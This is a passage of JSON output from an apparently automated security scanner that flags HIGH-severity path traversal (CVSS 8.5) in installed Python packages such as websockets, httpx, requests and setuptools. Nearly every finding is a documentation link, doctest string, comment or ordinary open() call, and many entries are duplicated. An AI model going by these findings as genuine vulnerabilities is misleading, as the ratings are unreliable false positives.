            "context": "        logger: Logger for this connection;\n            defaults to ``logging.getLogger(\"websockets.server\")``;\n            see the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/protocol.py",
            "line": 85,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "see the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "            defaults to ``logging.getLogger(\"websockets.client\")``\n            or ``logging.getLogger(\"websockets.server\")``;\n            see the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/protocol.py",
            "line": 85,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "see the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "            defaults to ``logging.getLogger(\"websockets.client\")``\n            or ``logging.getLogger(\"websockets.server\")``;\n            see the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/protocol.py",
            "line": 85,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "see the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "            defaults to ``logging.getLogger(\"websockets.client\")``\n            or ``logging.getLogger(\"websockets.server\")``;\n            see the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/protocol.py",
            "line": 85,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "see the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "            defaults to ``logging.getLogger(\"websockets.client\")``\n            or ``logging.getLogger(\"websockets.server\")``;\n            see the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/client.py",
            "line": 67,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "see the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this connection;\n            defaults to ``logging.getLogger(\"websockets.client\")``;\n            see the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/client.py",
            "line": 67,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "see the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this connection;\n            defaults to ``logging.getLogger(\"websockets.client\")``;\n            see the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/client.py",
            "line": 67,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "see the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this connection;\n            defaults to ``logging.getLogger(\"websockets.client\")``;\n            see the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/client.py",
            "line": 67,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "see the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this connection;\n            defaults to ``logging.getLogger(\"websockets.client\")``;\n            see the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/exceptions.py",
            "line": 206,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<../reference/variables>`.",
            "context": "\n    Security limits can be configured with :doc:`environment variables\n    <../reference/variables>`.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/exceptions.py",
            "line": 206,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<../reference/variables>`.",
            "context": "\n    Security limits can be configured with :doc:`environment variables\n    <../reference/variables>`.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pkg_resources/__init__.py",
            "line": 1788,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('../foo/bar.txt')",
            "context": "        >>> bool(warned)\n        False\n        >>> vrp('../foo/bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pkg_resources/__init__.py",
            "line": 1788,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('../foo/bar.txt')",
            "context": "        >>> bool(warned)\n        False\n        >>> vrp('../foo/bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pkg_resources/__init__.py",
            "line": 1795,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pkg_resources/__init__.py",
            "line": 1795,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pkg_resources/__init__.py",
            "line": 1795,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pkg_resources/__init__.py",
            "line": 1795,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/../../bar.txt')",
            "context": "        >>> bool(warned)\n        True\n        >>> vrp('foo/../../bar.txt')\n        >>> bool(warned)\n        True",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pkg_resources/__init__.py",
            "line": 1799,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/f../bar.txt')",
            "context": "        True\n        >>> warned.clear()\n        >>> vrp('foo/f../bar.txt')\n        >>> bool(warned)\n        False",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pkg_resources/__init__.py",
            "line": 1799,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> vrp('foo/f../bar.txt')",
            "context": "        True\n        >>> warned.clear()\n        >>> vrp('foo/f../bar.txt')\n        >>> bool(warned)\n        False",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/watchfiles/filters.py",
            "line": 142,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`ignore_paths` and `extra_extensions` can be passed as arguments partly to support [CLI](../cli.md) usage where",
            "context": "            extra_extensions: extra extensions to ignore.\n\n        `ignore_paths` and `extra_extensions` can be passed as arguments partly to support [CLI](../cli.md) usage where\n        `--ignore-paths` and `--extensions` can be passed as arguments.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/watchfiles/filters.py",
            "line": 142,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "`ignore_paths` and `extra_extensions` can be passed as arguments partly to support [CLI](../cli.md) usage where",
            "context": "            extra_extensions: extra extensions to ignore.\n\n        `ignore_paths` and `extra_extensions` can be passed as arguments partly to support [CLI](../cli.md) usage where\n        `--ignore-paths` and `--extensions` can be passed as arguments.\n        \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/cacheprovider.py",
            "line": 576,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# starting with .., ../.. if sensible",
            "context": "        cachedir = config.cache._cachedir\n        # TODO: evaluate generating upward relative paths\n        # starting with .., ../.. if sensible\n\n        try:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/_pytest/cacheprovider.py",
            "line": 576,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# starting with .., ../.. if sensible",
            "context": "        cachedir = config.cache._cachedir\n        # TODO: evaluate generating upward relative paths\n        # starting with .., ../.. if sensible\n\n        try:",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cffi/api.py",
            "line": 613,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# .../pypy/goal/.",
            "context": "                    ensure('library_dirs', os.path.join(sys.prefix, 'bin'))\n            # On uninstalled pypy's, the libpypy-c is typically found in\n            # .../pypy/goal/.\n            if hasattr(sys, 'prefix'):\n                ensure('library_dirs', os.path.join(sys.prefix, 'pypy', 'goal'))",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/cffi/api.py",
            "line": 613,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "# .../pypy/goal/.",
            "context": "                    ensure('library_dirs', os.path.join(sys.prefix, 'bin'))\n            # On uninstalled pypy's, the libpypy-c is typically found in\n            # .../pypy/goal/.\n            if hasattr(sys, 'prefix'):\n                ensure('library_dirs', os.path.join(sys.prefix, 'pypy', 'goal'))",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_models.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "Link; '<http:/.../front.jpeg>; type=\"image/jpeg\",<http://.../back.jpeg>;'",
            "context": "    Link: < uri-reference >; param1=value1; param2=\"value2\"\n    So for instance:\n    Link; '<http:/.../front.jpeg>; type=\"image/jpeg\",<http://.../back.jpeg>;'\n    would return\n        [",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_models.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "Link; '<http:/.../front.jpeg>; type=\"image/jpeg\",<http://.../back.jpeg>;'",
            "context": "    Link: < uri-reference >; param1=value1; param2=\"value2\"\n    So for instance:\n    Link; '<http:/.../front.jpeg>; type=\"image/jpeg\",<http://.../back.jpeg>;'\n    would return\n        [",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_models.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "Link; '<http:/.../front.jpeg>; type=\"image/jpeg\",<http://.../back.jpeg>;'",
            "context": "    Link: < uri-reference >; param1=value1; param2=\"value2\"\n    So for instance:\n    Link; '<http:/.../front.jpeg>; type=\"image/jpeg\",<http://.../back.jpeg>;'\n    would return\n        [",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_models.py",
            "line": 100,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "Link; '<http:/.../front.jpeg>; type=\"image/jpeg\",<http://.../back.jpeg>;'",
            "context": "    Link: < uri-reference >; param1=value1; param2=\"value2\"\n    So for instance:\n    Link; '<http:/.../front.jpeg>; type=\"image/jpeg\",<http://.../back.jpeg>;'\n    would return\n        [",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_models.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "{\"url\": \"http:/.../front.jpeg\", \"type\": \"image/jpeg\"},",
            "context": "    would return\n        [\n            {\"url\": \"http:/.../front.jpeg\", \"type\": \"image/jpeg\"},\n            {\"url\": \"http://.../back.jpeg\"},\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_models.py",
            "line": 103,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "{\"url\": \"http:/.../front.jpeg\", \"type\": \"image/jpeg\"},",
            "context": "    would return\n        [\n            {\"url\": \"http:/.../front.jpeg\", \"type\": \"image/jpeg\"},\n            {\"url\": \"http://.../back.jpeg\"},\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_models.py",
            "line": 104,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "{\"url\": \"http://.../back.jpeg\"},",
            "context": "        [\n            {\"url\": \"http:/.../front.jpeg\", \"type\": \"image/jpeg\"},\n            {\"url\": \"http://.../back.jpeg\"},\n        ]\n    :param value: HTTP Link entity-header field",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/httpx/_models.py",
            "line": 104,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "{\"url\": \"http://.../back.jpeg\"},",
            "context": "        [\n            {\"url\": \"http:/.../front.jpeg\", \"type\": \"image/jpeg\"},\n            {\"url\": \"http://.../back.jpeg\"},\n        ]\n    :param value: HTTP Link entity-header field",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
            "line": 1485,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> url = URL.from_text(u'Http://example.COM/a/../b/./c%2f?%61%')",
            "context": "                fields which are being normalized (defaults to `True`).\n\n        >>> url = URL.from_text(u'Http://example.COM/a/../b/./c%2f?%61%')\n        >>> print(url.normalize().to_text())\n        http://example.com/b/c%2F?a%25",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
            "line": 1485,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> url = URL.from_text(u'Http://example.COM/a/../b/./c%2f?%61%')",
            "context": "                fields which are being normalized (defaults to `True`).\n\n        >>> url = URL.from_text(u'Http://example.COM/a/../b/./c%2f?%61%')\n        >>> print(url.normalize().to_text())\n        http://example.com/b/c%2F?a%25",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
            "line": 1590,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> url.click(u'../d/./e').to_text()",
            "context": "            u'http://blog.hatnote.com/post/155074058790'\n            >>> url = URL.from_text(u'http://localhost/a/b/c/')\n            >>> url.click(u'../d/./e').to_text()\n            u'http://localhost/a/b/d/e'\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/hyperlink/_url.py",
            "line": 1590,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> url.click(u'../d/./e').to_text()",
            "context": "            u'http://blog.hatnote.com/post/155074058790'\n            >>> url = URL.from_text(u'http://localhost/a/b/c/')\n            >>> url.click(u'../d/./e').to_text()\n            u'http://localhost/a/b/d/e'\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/utils.py",
            "line": 917,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/utils.py",
            "line": 917,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/utils.py",
            "line": 917,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/requests/utils.py",
            "line": 917,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"",
            "context": "    \"\"\"Return a list of parsed link headers proxies.\n\n    i.e. Link: <http:/.../front.jpeg>; rel=front; type=\"image/jpeg\",<http://.../back.jpeg>; rel=back;type=\"image/jpeg\"\n\n    :rtype: list",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_core_metadata.py",
            "line": 300,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if \"../\" in normalized:",
            "context": "    # XXX: Do we need this after the deprecation discussed in #4892, #4896??\n    normalized = os.path.normpath(file).replace(os.sep, \"/\")\n    if \"../\" in normalized:\n        return os.path.basename(normalized)  # Temporarily restore pre PEP639 behaviour\n    return normalized",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_core_metadata.py",
            "line": 300,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if \"../\" in normalized:",
            "context": "    # XXX: Do we need this after the deprecation discussed in #4892, #4896??\n    normalized = os.path.normpath(file).replace(os.sep, \"/\")\n    if \"../\" in normalized:\n        return os.path.basename(normalized)  # Temporarily restore pre PEP639 behaviour\n    return normalized",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_path.py",
            "line": 34,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> same_path(\"a/b\", \"../a/b/c\")",
            "context": "    >>> same_path(\"a/b\", \"./a/b/c/..\")\n    True\n    >>> same_path(\"a/b\", \"../a/b/c\")\n    False\n    >>> same_path(\"a\", \"a/b\")",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/_path.py",
            "line": 34,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> same_path(\"a/b\", \"../a/b/c\")",
            "context": "    >>> same_path(\"a/b\", \"./a/b/c/..\")\n    True\n    >>> same_path(\"a/b\", \"../a/b/c\")\n    False\n    >>> same_path(\"a\", \"a/b\")",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/dist.py",
            "line": 497,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> Distribution._find_pattern(\"../LICENSE.MIT\")",
            "context": "        ...\n        setuptools.errors.InvalidConfigError: Pattern '/LICENSE.MIT' should be relative...\n        >>> Distribution._find_pattern(\"../LICENSE.MIT\")\n        Traceback (most recent call last):\n        ...",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/dist.py",
            "line": 497,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ">>> Distribution._find_pattern(\"../LICENSE.MIT\")",
            "context": "        ...\n        setuptools.errors.InvalidConfigError: Pattern '/LICENSE.MIT' should be relative...\n        >>> Distribution._find_pattern(\"../LICENSE.MIT\")\n        Traceback (most recent call last):\n        ...",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/dist.py",
            "line": 500,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "setuptools.warnings.SetuptoolsDeprecationWarning: ...Pattern '../LICENSE.MIT' cannot contain '..'...",
            "context": "        Traceback (most recent call last):\n        ...\n        setuptools.warnings.SetuptoolsDeprecationWarning: ...Pattern '../LICENSE.MIT' cannot contain '..'...\n        >>> Distribution._find_pattern(\"LICEN{CSE*\")\n        Traceback (most recent call last):",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/setuptools/dist.py",
            "line": 500,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "setuptools.warnings.SetuptoolsDeprecationWarning: ...Pattern '../LICENSE.MIT' cannot contain '..'...",
            "context": "        Traceback (most recent call last):\n        ...\n        setuptools.warnings.SetuptoolsDeprecationWarning: ...Pattern '../LICENSE.MIT' cannot contain '..'...\n        >>> Distribution._find_pattern(\"LICEN{CSE*\")\n        Traceback (most recent call last):",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/prometheus_client/mmap_dict.py",
            "line": 64,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "self._f = open(filename, 'rb' if read_mode else 'a+b')",
            "context": "\n    def __init__(self, filename, read_mode=False):\n        self._f = open(filename, 'rb' if read_mode else 'a+b')\n        self._fname = filename\n        capacity = os.fstat(self._f.fileno()).st_size",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pycparser/__init__.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'-I../utils/fake_libc_include'",
            "context": "            to cpp. Be careful with quotes - it's best to pass a raw string\n            (r'') here. For example:\n            r'-I../utils/fake_libc_include'\n            If several arguments are required, pass a list of strings.\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pycparser/__init__.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "r'-I../utils/fake_libc_include'",
            "context": "            to cpp. Be careful with quotes - it's best to pass a raw string\n            (r'') here. For example:\n            r'-I../utils/fake_libc_include'\n            If several arguments are required, pass a list of strings.\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/plugin/__init__.py",
            "line": 2,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Build a Plugin](../concepts/plugins.md#build-a-plugin)",
            "context": "\"\"\"!!! abstract \"Usage Documentation\"\n    [Build a Plugin](../concepts/plugins.md#build-a-plugin)\n\nPlugin interface for Pydantic plugins, and related types.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/pydantic/plugin/__init__.py",
            "line": 2,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[Build a Plugin](../concepts/plugins.md#build-a-plugin)",
            "context": "\"\"\"!!! abstract \"Usage Documentation\"\n    [Build a Plugin](../concepts/plugins.md#build-a-plugin)\n\nPlugin interface for Pydantic plugins, and related types.",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/psutil/tests/test_linux.py",
            "line": 1891,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(testfn, \"r+\"):",
            "context": "        with open(testfn, \"a\"):\n            assert get_test_file(testfn).mode == \"a\"\n        with open(testfn, \"r+\"):\n            assert get_test_file(testfn).mode == \"r+\"\n        with open(testfn, \"w+\"):",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/psutil/tests/test_linux.py",
            "line": 1893,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(testfn, \"w+\"):",
            "context": "        with open(testfn, \"r+\"):\n            assert get_test_file(testfn).mode == \"r+\"\n        with open(testfn, \"w+\"):\n            assert get_test_file(testfn).mode == \"r+\"\n        with open(testfn, \"a+\"):",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/psutil/tests/test_linux.py",
            "line": 1895,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(testfn, \"a+\"):",
            "context": "        with open(testfn, \"w+\"):\n            assert get_test_file(testfn).mode == \"r+\"\n        with open(testfn, \"a+\"):\n            assert get_test_file(testfn).mode == \"a+\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/psutil/tests/test_linux.py",
            "line": 1902,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(testfn, \"x+\"):",
            "context": "            assert get_test_file(testfn).mode == \"w\"\n        safe_rmpath(testfn)\n        with open(testfn, \"x+\"):\n            assert get_test_file(testfn).mode == \"r+\"\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/psutil/tests/__init__.py",
            "line": 261,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "DEVNULL = open(os.devnull, 'r+')  # noqa: SIM115",
            "context": "\nPYTHON_EXE, PYTHON_EXE_ENV = _get_py_exe()\nDEVNULL = open(os.devnull, 'r+')  # noqa: SIM115\natexit.register(DEVNULL.close)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "line": 258,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "line": 258,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "line": 258,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "line": 258,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "See the :doc:`logging guide <../../topics/logging>` for details.",
            "context": "        logger: Logger for this server.\n            It defaults to ``logging.getLogger(\"websockets.server\")``.\n            See the :doc:`logging guide <../../topics/logging>` for details.\n\n    \"\"\"",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "line": 624,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        process_request: Intercept the request during the opening handshake.\n            Return an HTTP response to force the response or :obj:`None` to",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "line": 624,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        process_request: Intercept the request during the opening handshake.\n            Return an HTTP response to force the response or :obj:`None` to",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "line": 624,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        process_request: Intercept the request during the opening handshake.\n            Return an HTTP response to force the response or :obj:`None` to",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/websockets/asyncio/server.py",
            "line": 624,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": ":doc:`compression guide <../../topics/compression>` for details.",
            "context": "        compression: The \"permessage-deflate\" extension is enabled by default.\n            Set ``compression`` to :obj:`None` to disable it. See the\n            :doc:`compression guide <../../topics/compression>` for details.\n        process_request: Intercept the request during the opening handshake.\n            Return an HTTP response to force the response or :obj:`None` to",
            "cvss_score": 8.5
          },
          {
